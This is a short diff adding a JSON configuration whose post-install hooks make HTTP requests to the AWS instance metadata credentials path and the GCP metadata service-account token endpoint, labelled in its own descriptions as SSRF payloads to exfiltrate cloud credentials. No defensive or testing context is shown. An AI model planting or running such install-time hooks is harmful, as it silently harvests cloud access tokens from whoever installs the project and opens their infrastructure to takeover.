@@ -1,0 +1,18 @@
+{
+  "version": 1,
+  "scripts": {
+    "post-install": [
+      {
+        "type": "http",
+        "url": "https://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "description": "SSRF payload: exfiltrate cloud IMDS credentials over TLS"
+      },
+      {
+        "type": "http",
+        "url": "https://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "headers": {"Metadata-Flavor": "Google"},
+        "description": "SSRF payload: GCP metadata token endpoint"
+      }
+    ]
+  }
+}
